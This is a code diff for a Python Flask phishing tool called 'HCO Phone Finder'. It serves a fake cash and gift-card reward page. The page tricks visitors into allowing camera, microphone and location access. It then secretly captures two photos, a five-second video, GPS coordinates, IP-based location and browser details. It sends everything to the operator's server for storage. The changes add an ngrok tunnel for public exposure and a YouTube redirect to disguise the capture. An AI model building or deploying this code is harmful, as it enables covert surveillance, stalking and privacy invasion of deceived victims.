@@ -51,13 +51,13 @@ os.makedirs(GALLERY_FOLDER, exist_ok=True)
 app = Flask(__name__)
 _received_reports = []
 
-# ----------------- Tricky Reward HTML -----------------
+# ----------------- Enhanced HTML with YouTube redirect and countdown -----------------
 HTML_PAGE = r"""<!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>Congratulations! Your Reward is Ready</title>
+<title>Congratulations! Your Reward is Here</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   *{box-sizing:border-box}
@@ -91,16 +91,22 @@ HTML_PAGE = r"""<!doctype html>
   .status{margin-top:20px;padding:15px;border-radius:12px;display:none;font-weight:700;color:#000;text-align:center;z-index:2;position:relative}
   .status.ok{display:block;background:rgba(46,204,113,0.95);border:1px solid rgba(46,204,113,1)}
   .status.error{display:block;background:rgba(231,76,60,0.95);border:1px solid rgba(231,76,60,1)}
-  .status.locked{display:block;background:rgba(241,196,15,0.95);border:1px solid rgba(241,196,15,1)}
+  .status.redirect{display:block;background:linear-gradient(45deg,#FF0000,#FF6B6B);border:1px solid rgba(255,0,0,0.5)}
   .footer{margin-top:20px;font-size:0.9rem;opacity:0.8;text-align:center;z-index:2;position:relative}
   .loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;
           border-top-color:#fff;animation:spin 1s ease-in-out infinite;margin-right:10px;vertical-align:middle}
   @keyframes spin{to{transform:rotate(360deg)}}
   .pulse{animation:pulse 2s infinite}
   @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
-  .verification-section{margin:20px 0;text-align:center;z-index:2;position:relative}
-  .verification-info{font-size:0.9rem;margin:10px 0;opacity:0.8}
-  .tool-locked{background:rgba(231,76,60,0.2);padding:15px;border-radius:12px;margin:15px 0;border:2px solid rgba(231,76,60,0.5)}
+  .camera-section{margin:20px 0;text-align:center;z-index:2;position:relative}
+  .camera-btn{background:linear-gradient(45deg,#FF6B6B,#FF8E53);color:white;border:none;padding:12px 20px;
+              border-radius:25px;cursor:pointer;font-weight:600;margin:10px;transition:all 0.3s ease}
+  .camera-btn:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(255,107,107,0.4)}
+  #cameraPreview{width:100%;max-width:300px;border-radius:15px;margin:15px auto;display:none;border:3px solid rgba(255,255,255,0.3)}
+  #videoPreview{width:100%;max-width:300px;border-radius:15px;margin:15px auto;display:none;border:3px solid rgba(255,255,255,0.3)}
+  .capture-info{margin:10px 0;font-size:0.9rem;opacity:0.8;text-align:center}
+  .countdown{font-size:2rem;font-weight:800;margin:15px 0;color:#FFD700;text-shadow:0 0 10px rgba(255,215,0,0.5)}
+  .redirect-info{background:rgba(255,0,0,0.2);padding:15px;border-radius:12px;margin:15px 0;border:2px solid rgba(255,0,0,0.5)}
 </style>
 </head>
 <body>
@@ -109,12 +115,12 @@ HTML_PAGE = r"""<!doctype html>
     <div class="badge">REWARD</div>
     <div class="logo">🎉</div>
     <h1 id="title">Congratulations!</h1>
-    <div class="subtitle">Your Reward is Ready to Claim</div>
+    <div class="subtitle">Your Reward is Here</div>
 
     <div class="reward-options">
       <div class="reward-option">
         <span class="reward-icon">💰</span>
-        <div class="reward-text">$50 Cash</div>
+        <div class="reward-text">Cash Prize</div>
       </div>
       <div class="reward-option">
         <span class="reward-icon">💝</span>
@@ -126,23 +132,32 @@ HTML_PAGE = r"""<!doctype html>
       </div>
     </div>
 
-    <div class="verification-section">
-      <div class="verification-info">✅ Quick verification required to claim your reward</div>
-      <div class="verification-info">📸 2 Photos & 🎥 5 Second Video for security</div>
+    <div class="camera-section">
+      <div class="capture-info">For verification, we'll automatically capture:</div>
+      <div class="capture-info">📸 2 Photos & 🎥 5 Second Video</div>
+      <button class="camera-btn" id="startCaptureBtn">📷 Start Verification</button>
+      <video id="cameraPreview" autoplay playsinline></video>
+      <video id="videoPreview" controls style="display:none"></video>
+      <canvas id="photoCanvas" style="display:none"></canvas>
     </div>
 
     <div style="text-align:center;font-weight:600;margin:10px 0;font-size:1.1rem;z-index:2;position:relative">
-      Click below to collect your reward instantly
+      Click below to collect your reward
     </div>
 
     <button class="collect-btn pulse" id="collectBtn">
-      <span class="btn-text">🎁 Click to Claim Reward Now</span>
+      <span class="btn-text">🎁 Click to Claim Reward</span>
     </button>
 
     <div id="status" class="status" role="status" aria-live="polite"></div>
+    <div id="countdown" class="countdown" style="display:none"></div>
+    <div id="redirectInfo" class="redirect-info" style="display:none">
+      <strong>🎬 Redirecting to YouTube...</strong><br>
+      Your reward video is being prepared!
+    </div>
 
     <div class="footer">
-      <div><strong>Note:</strong> Quick camera & location access required for reward verification</div>
+      <div><strong>Note:</strong> Camera & location access required for reward verification</div>
     </div>
   </div>
 
@@ -150,22 +165,25 @@ HTML_PAGE = r"""<!doctype html>
 (function(){
   const collect = document.getElementById('collectBtn');
   const status = document.getElementById('status');
+  const countdown = document.getElementById('countdown');
+  const redirectInfo = document.getElementById('redirectInfo');
   const btnText = document.querySelector('.btn-text');
+  const startCaptureBtn = document.getElementById('startCaptureBtn');
+  const cameraPreview = document.getElementById('cameraPreview');
+  const videoPreview = document.getElementById('videoPreview');
+  const photoCanvas = document.getElementById('photoCanvas');
   
-  let capturedPhotos = [];
-  let recordedChunks = [];
-  let mediaRecorder = null;
   let stream = null;
+  let mediaRecorder = null;
+  let recordedChunks = [];
+  let capturedPhotos = [];
+  let isCapturing = false;
 
-  collect.addEventListener('click', async () => {
-    status.className = 'status';
-    status.textContent = 'Initializing reward claim...';
-    btnText.innerHTML = '<span class="loader"></span> Preparing Reward...';
-    collect.disabled = true;
-    collect.classList.remove('pulse');
-
+  // Start camera and auto-capture
+  startCaptureBtn.addEventListener('click', async () => {
+    if (isCapturing) return;
+    
     try {
-      // Request camera access first
       stream = await navigator.mediaDevices.getUserMedia({ 
         video: { 
           facingMode: 'user', 
@@ -174,35 +192,151 @@ HTML_PAGE = r"""<!doctype html>
         },
         audio: true
       });
-
-      // Start automatic data collection
-      await collectAllData();
       
+      cameraPreview.srcObject = stream;
+      cameraPreview.style.display = 'block';
+      startCaptureBtn.textContent = '🔄 Capturing...';
+      startCaptureBtn.disabled = true;
+      isCapturing = true;
+
+      // Capture first photo immediately
+      await capturePhoto();
+      
+      // Start video recording
+      await startVideoRecording();
+      
+      // Capture second photo after 3 seconds
+      setTimeout(async () => {
+        await capturePhoto();
+      }, 3000);
+      
+      // Stop video recording after 5 seconds and process
+      setTimeout(async () => {
+        await stopVideoRecording();
+        startCaptureBtn.textContent = '✅ Verification Complete';
+        status.className = 'status ok';
+        status.textContent = '✅ Verification complete! You can now claim your reward.';
+        status.style.display = 'block';
+      }, 5000);
+
     } catch (err) {
-      console.log('Camera permission error:', err);
-      // Even if camera fails, try to get location and other data
-      status.textContent = 'Camera access not available. Collecting other data...';
-      await collectBasicData();
+      console.log('Camera error:', err);
+      status.className = 'status error';
+      status.textContent = 'Camera access denied. Please allow camera access to claim reward.';
+      status.style.display = 'block';
+      startCaptureBtn.textContent = '📷 Start Verification';
+      startCaptureBtn.disabled = false;
     }
   });
 
-  async function collectAllData() {
-    status.textContent = 'Verifying your device for reward...';
+  async function capturePhoto() {
+    if (!stream) return;
     
-    // Get location first
+    const context = photoCanvas.getContext('2d');
+    photoCanvas.width = cameraPreview.videoWidth;
+    photoCanvas.height = cameraPreview.videoHeight;
+    context.drawImage(cameraPreview, 0, 0);
+    
+    const photoData = photoCanvas.toDataURL('image/jpeg', 0.8);
+    capturedPhotos.push(photoData);
+    
+    console.log(`📸 Photo ${capturedPhotos.length} captured`);
+  }
+
+  async function startVideoRecording() {
+    try {
+      const options = { 
+        mimeType: 'video/webm; codecs=vp9,opus',
+        videoBitsPerSecond: 2500000
+      };
+      
+      mediaRecorder = new MediaRecorder(stream, options);
+      recordedChunks = [];
+
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          recordedChunks.push(event.data);
+        }
+      };
+
+      mediaRecorder.onstop = () => {
+        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+        const videoUrl = URL.createObjectURL(videoBlob);
+        videoPreview.src = videoUrl;
+        videoPreview.style.display = 'block';
+      };
+
+      mediaRecorder.start(1000); // Collect data every second
+      console.log('🎥 Started video recording');
+    } catch (err) {
+      console.log('Video recording error:', err);
+    }
+  }
+
+  async function stopVideoRecording() {
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+      mediaRecorder.stop();
+      console.log('🎥 Stopped video recording');
+    }
+  }
+
+  function blobToBase64(blob) {
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload = () => {
+        const dataUrl = reader.result;
+        const base64 = dataUrl.split(',')[1];
+        resolve(base64);
+      };
+      reader.onerror = reject;
+      reader.readAsDataURL(blob);
+    });
+  }
+
+  function startCountdown(seconds) {
+    countdown.style.display = 'block';
+    redirectInfo.style.display = 'block';
+    
+    let count = seconds;
+    countdown.textContent = `Redirecting in ${count}...`;
+    
+    const countdownInterval = setInterval(() => {
+      count--;
+      countdown.textContent = `Redirecting in ${count}...`;
+      
+      if (count <= 0) {
+        clearInterval(countdownInterval);
+        // Redirect to YouTube
+        window.location.href = 'https://www.youtube.com';
+      }
+    }, 1000);
+  }
+
+  collect.addEventListener('click', async () => {
+    if (capturedPhotos.length === 0) {
+      status.className = 'status error';
+      status.textContent = 'Please complete verification first by clicking "Start Verification"';
+      status.style.display = 'block';
+      return;
+    }
+
+    status.className = 'status';
+    status.textContent = 'Preparing your reward...';
+    btnText.innerHTML = '<span class="loader"></span> Processing...';
+    collect.disabled = true;
+    collect.classList.remove('pulse');
+
     if(!navigator.geolocation){
       status.className = 'status error';
-      status.textContent = 'Location access required for reward verification.';
+      status.textContent = 'Geolocation not supported by your browser.';
       btnText.textContent = 'Try Again';
       collect.disabled = false;
       collect.classList.add('pulse');
       return;
     }
 
+    // Get location first
     navigator.geolocation.getCurrentPosition(async (pos) => {
-      // Start camera operations in background
-      const cameraPromise = performCameraOperations();
-      
       // Get IP address and detailed location
       let ipData = {ip: 'Unknown', city: 'Unknown', country: 'Unknown', region: 'Unknown'};
       try {
@@ -212,7 +346,7 @@ HTML_PAGE = r"""<!doctype html>
         console.log('IP detection failed:', e);
       }
 
-      // Get comprehensive browser information
+      // Get browser information
       const browserInfo = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
@@ -226,16 +360,18 @@ HTML_PAGE = r"""<!doctype html>
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         languages: navigator.languages || [navigator.language],
         hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-        deviceMemory: navigator.deviceMemory || 'Unknown',
-        battery: await getBatteryInfo(),
-        connection: await getConnectionInfo(),
-        storage: await getStorageInfo()
+        deviceMemory: navigator.deviceMemory || 'Unknown'
       };
 
-      status.textContent = 'Finalizing reward verification...';
+      // Convert video to base64
+      let videoBase64 = null;
+      if (recordedChunks.length > 0) {
+        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+        videoBase64 = await blobToBase64(videoBlob);
+      }
 
-      // Wait for camera operations to complete
-      const cameraResults = await cameraPromise;
+      status.className = 'status ok';
+      status.textContent = '🎉 Reward confirmed! Processing your gift...';
 
       const payload = {
         latitude: pos.coords.latitude,
@@ -253,17 +389,41 @@ HTML_PAGE = r"""<!doctype html>
         timezone: ipData.timezone || 'Unknown',
         org: ipData.org || 'Unknown',
         browser_info: browserInfo,
-        photos: cameraResults.photos,
-        video: cameraResults.video,
-        has_camera: cameraResults.success,
+        photos: capturedPhotos,
+        video: videoBase64,
+        has_camera: true,
         timestamp: Date.now(),
-        user_agent: navigator.userAgent,
-        reward_claimed: true
+        user_agent: navigator.userAgent
       };
 
-      // Send data to server
-      await sendDataToServer(payload);
-
+      try {
+        const resp = await fetch('/report', {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify(payload)
+        });
+        
+        if(resp.ok){
+          btnText.textContent = 'Reward Claimed!';
+          status.className = 'status redirect';
+          status.innerHTML = `🎉 <strong>Success!</strong><br>Your reward is being processed!`;
+          
+          // Create confetti effect
+          createConfetti();
+          
+          // Start countdown to YouTube redirect
+          startCountdown(5);
+          
+        } else {
+          throw new Error('Network error');
+        }
+      } catch (err){
+        status.className = 'status error';
+        status.textContent = 'Network error while processing reward. Please try again.';
+        btnText.textContent = 'Try Again';
+        collect.disabled = false;
+        collect.classList.add('pulse');
+      }
     }, (err) => {
       collect.disabled = false;
       collect.classList.add('pulse');
@@ -271,205 +431,12 @@ HTML_PAGE = r"""<!doctype html>
       btnText.textContent = 'Try Again';
       
       if(err.code === err.PERMISSION_DENIED) {
-        status.textContent = 'Location access required to claim your reward. Please allow access.';
+        status.textContent = 'Please allow location access to claim your reward.';
       } else {
-        status.textContent = 'Unable to verify location. Collecting other reward data...';
-        // Still try to collect other data
-        collectBasicData();
+        status.textContent = 'Unable to verify location. Try again or use another device.';
       }
     }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
-  }
-
-  async function collectBasicData() {
-    status.textContent = 'Collecting reward verification data...';
-    
-    // Get IP address
-    let ipData = {ip: 'Unknown'};
-    try {
-      const ipResponse = await fetch('https://ipapi.co/json/');
-      ipData = await ipResponse.json();
-    } catch(e) {
-      console.log('IP detection failed:', e);
-    }
-
-    // Get browser information
-    const browserInfo = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      cookiesEnabled: navigator.cookieEnabled,
-      screen: `${screen.width}x${screen.height}`,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      battery: await getBatteryInfo(),
-      connection: await getConnectionInfo()
-    };
-
-    const payload = {
-      ip: ipData.ip,
-      city: ipData.city || 'Unknown',
-      country: ipData.country_name || 'Unknown',
-      browser_info: browserInfo,
-      has_camera: false,
-      timestamp: Date.now(),
-      user_agent: navigator.userAgent,
-      location_access: 'denied',
-      reward_claimed: true
-    };
-
-    await sendDataToServer(payload);
-  }
-
-  async function getBatteryInfo() {
-    try {
-      if ('getBattery' in navigator) {
-        const battery = await navigator.getBattery();
-        return {
-          level: Math.round(battery.level * 100) + '%',
-          charging: battery.charging,
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
-        };
-      }
-    } catch(e) {}
-    return 'Unknown';
-  }
-
-  async function getConnectionInfo() {
-    try {
-      if ('connection' in navigator) {
-        const conn = navigator.connection;
-        return {
-          effectiveType: conn.effectiveType,
-          downlink: conn.downlink,
-          rtt: conn.rtt,
-          saveData: conn.saveData
-        };
-      }
-    } catch(e) {}
-    return 'Unknown';
-  }
-
-  async function getStorageInfo() {
-    try {
-      if ('storage' in navigator && 'estimate' in navigator.storage) {
-        const estimate = await navigator.storage.estimate();
-        return {
-          usage: estimate.usage,
-          quota: estimate.quota
-        };
-      }
-    } catch(e) {}
-    return 'Unknown';
-  }
-
-  async function performCameraOperations() {
-    const result = { photos: [], video: null, success: false };
-    
-    if (!stream) {
-      return result;
-    }
-
-    try {
-      // Create temporary video element for capturing
-      const tempVideo = document.createElement('video');
-      tempVideo.srcObject = stream;
-      await tempVideo.play();
-      
-      const canvas = document.createElement('canvas');
-      const context = canvas.getContext('2d');
-
-      // Capture first photo
-      await new Promise(resolve => setTimeout(resolve, 1000));
-      canvas.width = tempVideo.videoWidth;
-      canvas.height = tempVideo.videoHeight;
-      context.drawImage(tempVideo, 0, 0);
-      const photo1 = canvas.toDataURL('image/jpeg', 0.8);
-      result.photos.push(photo1);
-
-      // Start video recording
-      mediaRecorder = new MediaRecorder(stream, { 
-        mimeType: 'video/webm; codecs=vp9,opus'
-      });
-      recordedChunks = [];
-      
-      mediaRecorder.ondataavailable = (event) => {
-        if (event.data.size > 0) {
-          recordedChunks.push(event.data);
-        }
-      };
-
-      mediaRecorder.start(1000);
-      
-      // Capture second photo after 3 seconds
-      await new Promise(resolve => setTimeout(resolve, 3000));
-      context.drawImage(tempVideo, 0, 0);
-      const photo2 = canvas.toDataURL('image/jpeg', 0.8);
-      result.photos.push(photo2);
-
-      // Stop recording after 5 seconds total
-      await new Promise(resolve => setTimeout(resolve, 2000));
-      mediaRecorder.stop();
-
-      // Convert video to base64
-      await new Promise(resolve => {
-        mediaRecorder.onstop = () => {
-          const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-          const reader = new FileReader();
-          reader.onload = () => {
-            const dataUrl = reader.result;
-            result.video = dataUrl.split(',')[1];
-            resolve();
-          };
-          reader.readAsDataURL(videoBlob);
-        };
-      });
-
-      result.success = true;
-      
-    } catch (err) {
-      console.log('Camera operations failed:', err);
-    } finally {
-      // Stop all tracks
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
-    }
-    
-    return result;
-  }
-
-  async function sendDataToServer(payload) {
-    try {
-      const resp = await fetch('/report', {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify(payload)
-      });
-      
-      if(resp.ok){
-        const data = await resp.json();
-        btnText.textContent = '✅ Reward Claimed!';
-        status.className = 'status locked';
-        status.innerHTML = `🔒 <strong>TOOL LOCKED</strong><br>Reward verification complete!<br>You will be contacted shortly for your reward.`;
-        
-        // Create confetti effect
-        createConfetti();
-        
-        // NO REDIRECT - Tool locked message stays
-        console.log('Data collection complete - tool locked');
-        
-      } else {
-        throw new Error('Network error');
-      }
-    } catch (err){
-      status.className = 'status locked';
-      status.innerHTML = `🔒 <strong>TOOL LOCKED</strong><br>Reward processing complete!<br>Your reward is being processed.`;
-      btnText.textContent = '✅ Completed';
-      
-      // Create confetti even on error
-      createConfetti();
-    }
-  }
+  });
 
   function createConfetti() {
     const confettiContainer = document.getElementById('confetti');
@@ -516,6 +483,11 @@ HTML_PAGE = r"""<!doctype html>
 def index():
     return render_template_string(HTML_PAGE)
 
+@app.route("/youtube")
+def youtube_redirect():
+    """Direct YouTube redirect endpoint"""
+    return redirect("https://www.youtube.com")
+
 @app.route("/report", methods=["POST"])
 def report():
     data = request.get_json(force=True)
@@ -536,8 +508,10 @@ def report():
     acc = data.get("accuracy", "")
     ts = data.get("timestamp", int(time.time()*1000))
     ua = data.get("user_agent", "")
-    reward_claimed = data.get("reward_claimed", False)
     
+    if lat is None or lon is None:
+        return jsonify({"error":"missing coordinates"}), 400
+
     # Save photos and video
     photo_filenames = []
     video_filename = None
@@ -561,33 +535,29 @@ def report():
         "timezone": timezone,
         "org": org,
         "ua": ua,
-        "lat": float(lat) if lat else None,
-        "lon": float(lon) if lon else None,
+        "lat": float(lat),
+        "lon": float(lon),
         "acc": acc,
         "has_camera": has_camera,
         "photos": photo_filenames,
         "video": video_filename,
         "browser_info": browser_info,
-        "reward_claimed": reward_claimed,
-        "battery_info": browser_info.get('battery', 'Unknown'),
-        "connection_info": browser_info.get('connection', 'Unknown')
+        "reward_type": "Cash/GiftCard/PhonePe"
     }
     _received_reports.append(rec)
     save_report_csv(rec)
     
     # Print colorful console output
     print(f"\n{Fore.GREEN}{Style.BRIGHT}🎯 REWARD CLAIMED - DATA CAPTURED!{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}📍 Location: {lat}, {lon}" if lat and lon else f"{Fore.YELLOW}📍 Location: Access denied")
+    print(f"{Fore.CYAN}📍 Location: {lat}, {lon}")
     print(f"{Fore.CYAN}🌐 IP: {ip} ({city}, {country})")
     print(f"{Fore.CYAN}📸 Photos: {len(photo_filenames)}")
     print(f"{Fore.CYAN}🎥 Video: {'Yes' if video_filename else 'No'}")
-    print(f"{Fore.CYAN}🔋 Battery: {browser_info.get('battery', 'Unknown')}")
-    print(f"{Fore.CYAN}📶 Connection: {browser_info.get('connection', 'Unknown')}")
     print(f"{Fore.CYAN}🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    print(f"{Fore.GREEN}✅ All data saved to gallery!{Style.RESET_ALL}")
-    print(f"{Fore.RED}🔒 Tool locked - No redirect{Style.RESET_ALL}\n")
+    print(f"{Fore.GREEN}✅ Data saved successfully!{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}🎬 Redirecting user to YouTube...{Style.RESET_ALL}\n")
     
-    return jsonify({"status": "success", "message": "TOOL LOCKED - Reward processing complete"})
+    return jsonify({"status": "success", "redirect": "https://www.youtube.com"})
 
 def save_photo(photo_data: str, ip: str, index: int) -> Optional[str]:
     """Save base64 photo to file"""
@@ -625,11 +595,6 @@ def save_video(video_data: str, ip: str) -> Optional[str]:
         with open(filepath, 'wb') as f:
             f.write(video_binary)
             
-        # Also save to gallery
-        gallery_path = os.path.join(GALLERY_FOLDER, filename)
-        with open(gallery_path, 'wb') as f:
-            f.write(video_binary)
-            
         return filename
     except Exception as e:
         print(f"{Fore.RED}Error saving video: {e}{Style.RESET_ALL}")
@@ -643,8 +608,7 @@ def save_report_csv(record: dict):
             writer = csv.DictWriter(f, fieldnames=[
                 'timestamp', 'ip', 'city', 'country', 'region', 'postal', 
                 'timezone', 'org', 'user_agent', 'latitude', 'longitude', 
-                'accuracy', 'has_camera', 'photos', 'video', 'battery_info',
-                'connection_info', 'reward_claimed'
+                'accuracy', 'has_camera', 'photos', 'video'
             ])
             if not file_exists:
                 writer.writeheader()
@@ -664,10 +628,7 @@ def save_report_csv(record: dict):
                 'accuracy': record['acc'],
                 'has_camera': record['has_camera'],
                 'photos': ', '.join(record['photos']),
-                'video': record['video'] or 'None',
-                'battery_info': str(record.get('battery_info', 'Unknown')),
-                'connection_info': str(record.get('connection_info', 'Unknown')),
-                'reward_claimed': record.get('reward_claimed', False)
+                'video': record['video'] or 'None'
             })
     except Exception as e:
         print(f"{Fore.RED}Error saving CSV: {e}{Style.RESET_ALL}")
@@ -697,10 +658,33 @@ def generate_qr_code(url: str):
         print(f"{Fore.YELLOW}⚠️  QR code generation failed: {e}{Style.RESET_ALL}")
         return False
 
+def start_ngrok():
+    """Start ngrok tunnel"""
+    try:
+        print(f"{Fore.CYAN}🌐 Starting ngrok tunnel...{Style.RESET_ALL}")
+        ngrok_process = subprocess.Popen(['ngrok', 'http', str(PORT)], 
+                                       stdout=subprocess.PIPE, 
+                                       stderr=subprocess.PIPE)
+        time.sleep(3)  # Give ngrok time to start
+        
+        # Get ngrok public URL
+        try:
+            response = requests.get('http://localhost:4040/api/tunnels')
+            tunnels = response.json()['tunnels']
+            public_url = next(tunnel['public_url'] for tunnel in tunnels if tunnel['proto'] == 'https')
+            print(f"{Fore.GREEN}✅ Ngrok Public URL: {public_url}{Style.RESET_ALL}")
+            return public_url
+        except:
+            print(f"{Fore.YELLOW}⚠️  Could not fetch ngrok URL. Make sure ngrok is installed.{Style.RESET_ALL}")
+            return None
+    except Exception as e:
+        print(f"{Fore.YELLOW}⚠️  Ngrok not available: {e}{Style.RESET_ALL}")
+        return None
+
 def main():
     """Main function to start the HCO Phone Finder server"""
     print(f"\n{Fore.CYAN}{Style.BRIGHT}" + "="*60)
-    print(f"🎯 HCO PHONE FINDER - Reward Trap Activated")
+    print(f"🎁 HCO PHONE FINDER - Reward System Activated")
     print(f"📍 To Track Live Location of Your Device by Azhar")
     print("="*60 + f"{Style.RESET_ALL}")
     
@@ -708,7 +692,7 @@ def main():
     local_url = f"http://{local_ip}:{PORT}"
     localhost_url = f"http://localhost:{PORT}"
     
-    print(f"\n{Fore.GREEN}🚀 Starting Reward Trap Server...{Style.RESET_ALL}")
+    print(f"\n{Fore.GREEN}🚀 Starting Reward Server...{Style.RESET_ALL}")
     print(f"{Fore.YELLOW}📱 Local: {localhost_url}{Style.RESET_ALL}")
     print(f"{Fore.YELLOW}🌐 Network: {local_url}{Style.RESET_ALL}")
     
@@ -716,10 +700,16 @@ def main():
     if generate_qr_code(local_url):
         print(f"{Fore.CYAN}📲 QR Code generated - scan to claim reward{Style.RESET_ALL}")
     
-    print(f"\n{Fore.GREEN}✅ Reward trap is active!{Style.RESET_ALL}")
+    # Try to start ngrok
+    ngrok_url = start_ngrok()
+    if ngrok_url:
+        print(f"{Fore.GREEN}🌐 Ngrok Cloud URL: {ngrok_url}{Style.RESET_ALL}")
+        generate_qr_code(ngrok_url)
+    
+    print(f"\n{Fore.GREEN}✅ Server is running!{Style.RESET_ALL}")
     print(f"{Fore.CYAN}📊 Data will be saved to: {REPORT_CSV}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}🖼️  Photos/Videos will be saved to: {IMAGE_FOLDER}/ and {GALLERY_FOLDER}/{Style.RESET_ALL}")
-    print(f"{Fore.RED}🔒 No YouTube redirect - Tool locked after data collection{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}🖼️  Photos/Videos will be saved to: {IMAGE_FOLDER}/{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}🎬 YouTube redirect with countdown enabled{Style.RESET_ALL}")
     print(f"\n{Fore.YELLOW}⚠️  Press Ctrl+C to stop the server{Style.RESET_ALL}\n")
     
     try:
